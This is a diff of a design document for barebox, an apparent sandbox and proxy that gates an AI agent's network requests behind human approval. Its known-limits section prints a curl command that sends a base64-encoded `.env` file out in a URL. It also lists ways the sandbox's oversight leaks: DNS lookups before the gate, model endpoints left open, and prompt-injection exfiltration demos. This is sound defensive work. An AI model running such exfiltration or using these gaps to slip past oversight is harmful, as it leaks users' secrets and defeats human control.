@@ -12,7 +12,7 @@ This PRD follows the minimum content from AGENT_RULES.md "Operating Flow": Probl
 
 Agents need real access to be useful: shell, files, network. Today a developer picks one of two bad options.
 
-- **Approve everything.** About forty prompts per task. People stop reading them, or switch prompts off.
+- **Approve everything.** A prompt for nearly every command and edit. People stop reading them, or switch prompts off.
 - **Heavy isolation.** Docker or a VM. Images, a daemon, root, and the agent can't use the installed toolchain. Most people skip it.
 
 Neither matches where the risk is. Reads are mostly harmless. File writes can be fixed. Only a few actions can't be undone: paying, sending, publishing, pushing.
@@ -473,7 +473,7 @@ Order is dependency order. Each module is a POC aimed at its riskiest assumption
 
 *Memory (decided Oct 29).* The `sbx` proxy runs with `--max-semi-space-size=1`, set in the CLI's first line (`#!/usr/bin/env -S node --max-semi-space-size=1`). It caps the V8 young generation at 1 MB. Library embedders set their own Node flags, and the docs recommend this one. Latency with and without the flag was measured Oct 29 (`scripts/latency.mjs`, 2000 requests, 3 runs): p50 the same (about 0.8–1.0 ms); p95/p99 up to about 0.5 ms slower in 2 of 3 runs, the same in the third. See `docs/logs/findings.md`, "M3 — part A results".
 
-*The queue.* Only requests that need the human's answer enter an agent's line. Allowed requests flow even while asks wait. Per agent: 1 held, up to 16 waiting unread (the bytes stay in the kernel socket buffer, not in proxy memory), and the next is refused at once with 429. Each has a 120 s deadline from arrival. On timeout it is denied with 403 "timed out", and a late answer is ignored. barebox never retries. Whether to try again is the agent's choice, and a retry is a new request with a new ask id.
+*The queue.* Only requests that need the human's answer enter an agent's line. Allowed requests flow even while asks wait. Per agent: 1 held, up to 16 waiting unread (the bytes stay in the kernel socket buffer, not in proxy memory), and the next is refused at once with 429. Any deadline counts from arrival (`sbx run` has none by default; the library default is 120 s). On timeout it is denied with 403 "timed out", and a late answer is ignored. barebox never retries. Whether to try again is the agent's choice, and a retry is a new request with a new ask id.
 
 *Gate facts (learned Oct 29).* `check()` returns allow or deny, never `askHuman`. After a human allow the rule is `humanChannel.allow`; after a deny the original rule stays. A null tool falls back to type `net` and is `rwx.unlisted`, so barebox always sends a tool. The audit config key is `audit.path`.
 
@@ -675,6 +675,16 @@ Findings from the real-agent run (not fixed in M6):
 - Answering a hold from a second terminal (env var, temp path, `rule=` codes) was too technical. `sbx run` now asks in its own terminal, in plain words (`⏸ <name> wants to SEND data to <host>`, why, URL, masked data, `Allow? [y/N]`), when stdin and stderr are terminals and `--json` is off. A key typed before a question opens never answers it. A second terminal (`sbx approve/deny`) still works, and the first answer wins. Both write through the one answer writer.
 - One `sbx run` is one sandbox with one agent, so the user names the sandbox: `sbx run --name <n>` sets the agent name and a fixed runtime dir (`$XDG_RUNTIME_DIR/barebox/<n>`, else `<tmpdir>/sbx-<uid>/<n>`), and every other command takes `--name` instead of `SBX_RUNTIME` (giving both is an error).
 - Demo B is `examples/demo-b/run.sh`: one 10-step workflow under ask, auto and trust, asserting every cell, plus two agents at once for commit and rollback. The scripted driver is the proof. The `claude -p` driver is best effort: the API's own safeguards (`[cyber]`) refuse the injection text, so a real agent runs only the legitimate steps.
+
+**Decisions (user, Nov 3), Demo A and M7 scope:**
+- Demo A is `examples/demo-a/run.sh`, built like Demo B: run by hand, not in `npm test` or the tarball. The scripted driver asserts every step and exits 1 on any FAIL. `--driver claude` is best effort, and `--live` lets the user answer the prompts.
+- Steps: search, pay, email. The search is `GET httpbin /anything/search` and runs free. The payment is `POST /anything/v1/payment_intents`: its path holds `/payment`, so the floor holds it, and the key appears in httpbin's echo only after approval. The itinerary email is a second hold.
+- Modes: all three, chosen at start with `--mode ask|auto|trust|all`, as in Demo B. Expected: search free in every mode; payment held in every mode (floor); email held in ask and auto (`x`), free in trust.
+- Scope: Demo A, the README numbers, and four fix-ledger items (user, Nov 3): a late `sbx approve` prints "approved" for an already-decided hold; a mistyped `--name` says "nothing held"; a stale half-typed answer can approve the next hold (its test misses it); the README's Node-location sentences are stale.
+- Terminal colors (user, Nov 3): `sbx run`'s question and answer lines get basic ANSI colors when stderr is a TTY and `NO_COLOR` is unset: yellow header, bold agent name, bold labels, cyan URL, dim data and hold id, green allowed, red denied or timed out. `--json` and piped output stay plain. The hold id reads `(hold h2)`. Demo A colors its own STEP, key and summary lines the same way.
+- Hold wait (user, Nov 3): the default is now **wait until answered** (`holdTimeoutSec` default `"never"`, was 120). `sbx run --hold <seconds|never>` sets it per run and overrides the config key. The backlog stays bounded: one held request per agent, 16 waiting, the 17th gets 429. Held bodies stay spooled to disk. The library's `createHolds`/`createProxy` default stays 120 s for API callers.
+- Recorded demo (user, Nov 3): the video is a **live muse run**, `run.sh --driver muse --live`: Meta's muse model (`meta-models/muse-spark-open-1026`, via Baseten) books the flight inside barebox and the user answers each question. Model calls are labelled `r` with an rwxmap label (`examples/demo-a/labels/baseten`), and the Baseten key is a barebox secret (the agent holds a placeholder). The 9 scripted-approver muse runs (3 per mode) are kept as evidence in `docs/logs/m7-muse-runs/`; which prompts-per-task number goes in the README is decided later. Known gap, logged for after the freeze: a model endpoint labelled `r` is an open channel; a fix idea is to allow a model call freely only when it carries the run's secret placeholder.
+- Start time (measured Nov 3, load ~2, 11 runs): `sbx run -- true` median **0.70 s** (0.56-0.80), proxy start to teardown; 0.80 s with `--overlay`. Bare bwrap is 6 ms and `node -e 0` 0.16 s on the same box, so most of it is Node starting the proxy and the CLI. The README's old "10 ms" was the M0 bwrap-only figure. The recorded Demo A take (31 requests: 23 free, 8 asked) and Demo B (3 of 3 exfiltration attempts blocked in every mode) are the README's demo numbers; a prompts-per-task comparison against a stock agent stays open.
 | Estimate | 1.5 days. |
 
 ### Total
@@ -695,7 +705,7 @@ This is a plan, not a result. It shifts as POCs return. Review cap per module: o
 | 7 | Nov 1 | M5 (keys) | |
 | 8 | Nov 2 | M6 numbers. Demo B. | Memory targets measured |
 | 9 | Nov 3 | Demo A, README. Freeze in the evening. | |
-| 10 | Nov 4 | Release 0.6.0 and submission (0.5.0 shipped M3 on Oct 30) | |
+| 10 | Nov 4 | Release 0.9.0 and submission (0.6.0 shipped M5 on Nov 1, 0.8.0 on Nov 2) | |
 | 11 | Nov 5 | Buffer only, before 01:00 Amsterdam time | |
 
 Days 1–3 are results; the rest is a plan. F1 (bareguard `askUnheld`) and F2 (rwxmap `match` entry) land in their own repos and gate M3's `auto`/`ask` modes; if either slips, M3 ships `trust` + floor first.
@@ -715,6 +725,10 @@ Not sorted into the 10 days.
 | GraphQL / gRPC parsing | |
 | Llama end-of-run summary | Plain-language summary of the diff and audit log, flags off-task changes; model output treated as untrusted. Optional, not required for the hackathon. |
 | Go proxy rewrite | See the verdict below. |
+| URL data check (parked Nov 3, reopen about Nov 10) | Closes the bulk case of "data in a GET" (section 10). A mark like `cardLike`: a request whose query or path is longer than N bytes, or holds an unbroken base64/hex run of M+ characters, asks in every mode (a mark only adds an ask, so no bareguard change). **Sizing first:** set N and M from real traffic before building, using the Demo A audit plus a Claude Code `sbx run` audit, and list the longest legitimate URLs (signed S3 links, OAuth redirects, page cursors). The test must show the `base64 .env` GET red today, asking after, and a Claude Code run with zero new asks. It does not stop data sent in small pieces; docs say "large data in a URL asks", not "closed". Estimate about half a day: brief, one worker, mutation, suite 3x, Demo A and B, real-agent smoke. |
+| First-contact host ask plus DNS after the gate | Closes the small-pieces case: the first request to a host new in this run asks (in `ask` and `auto`; model endpoints and secret-bound hosts exempt). Needs "DNS resolves before the gate" (section 10) fixed first, or a hostname leaks before the ask. Socket code; size after the URL data check lands. |
+| Model call key check | Model endpoints go free only with the run's own secret placeholder, else `x` (section 10). |
+| Letter accuracy (rwxmap with rwxlite) | Replaces "letter by method" for APIs with a spec: POST reads and AWS-style `?Action=` GETs (rwxlite, Nov 3: label recipe 98.5% on GETs, 93% on POSTs; model not yet evaluated; TF-IDF baseline about 1.5 ms per call). Spec-only: no help for hosts without a spec or body-dependent RPC (GraphQL, JSON-RPC). Does not close the leaks. |
 
 **Go verdict, verbatim:**
 
@@ -730,6 +744,12 @@ Not sorted into the 10 days.
 - **Payment domains are not built.** Only the four path fragments (`/checkout`, `/payment`, `/orders`, `/purchase`) ask as the payment floor; a request to a known payment domain on any other path is decided by its letter and the mode.
 - **Held bodies add up on disk.** Each agent has one parked body of up to 50 MB (`heldBodyMaxMB`) in `<runtime>/held`, so 40 agents can hold 2 GB; the runtime defaults to a temp dir, which is often a RAM-backed tmpfs. There is no total cap, and the 145-175 MB budget (superseded Nov 2: about 205-245 MB over HTTPS, see M6) does not count it.
 - **Certificate pinning breaks inspection.** Out of scope.
+- **Data in a GET leaves free in every mode (found Nov 3, reproduced).** `r` (GET/HEAD) is free by design, but the URL carries data to any host that resolves: in `ask` mode, `curl "https://httpbin.org/anything/pixel.gif?d=$(base64 .env)"` delivered the file with 0 asks. Demo B's attacker host is `attacker.invalid`, refused only as unresolvable, so it never covered this. Nothing tried yet. Options: ask on first contact with a new host per run; treat a large or high-entropy query as `x`; a free-read host list with the rest asking in `ask`. **Decided Nov 3 (user): known limit for the hackathon release; the fix is parked, specced with sizing in section 9 (URL data check, then first-contact host ask).** The first-contact option needs the DNS fix below, or a hostname still leaks before the ask.
+- **DNS resolves before the gate (found Nov 3, code-verified, not observed on the wire).** `checkUpstream` resolves the hostname on arrival (`src/proxy.js:666` for plain HTTP, `:943` at CONNECT), before the gate decides, so data encoded in a hostname reaches the attacker's name server even when the request is then held or denied, in every mode. Nothing tried yet. Fix: decide first, resolve after; for CONNECT, resolve when the first request in the tunnel is decided. **Decided Nov 3 (user): known limit for the hackathon release; the fix is planned after it.**
+- **Model endpoints are an open channel.** Built-in model endpoints and a model API labelled `r` go out free in every mode with any key, an attacker's included. Ledger since Nov 2. Fix idea: free only when the call carries the run's own secret placeholder, else `x`.
+- **A model API labelled `r` is still card-scanned** (found Nov 3). Only the built-in endpoints and `localLlm` skip the card floor (`modelTools`). With a card number anywhere in the conversation, every later call to a labelled model API (Baseten in Demo A) is held. README corrected.
+- **A Node install dir that contains the runtime shows `asks/` and other agents' sockets inside** (ledger, reproduced Nov 1). Rare layout. Fix: refuse such a runtime, or mask it under the Node bind.
+- **Better letters do not close these leaks.** A request classifier (rwxmap labels, or the rwxlite model in training) makes `r`/`w`/`x` more accurate per operation, and can mark payment APIs. It cannot fix the leaks above: a GET carrying data is still a read, a model call is still `r`, and DNS order, the `~/.claude` mask and the Node bind are not about letters. Those need policy or proxy changes. Letter accuracy is a separate track after the hackathon.
 - **The proxy sees traffic, not intent.** Every API needs a mapping. File edits and local stdio MCP servers never touch the network. The undo layer and locked paths cover files. An MCP server running outside the sandbox with its own credentials is a hole.
 
 ## 11. Open questions
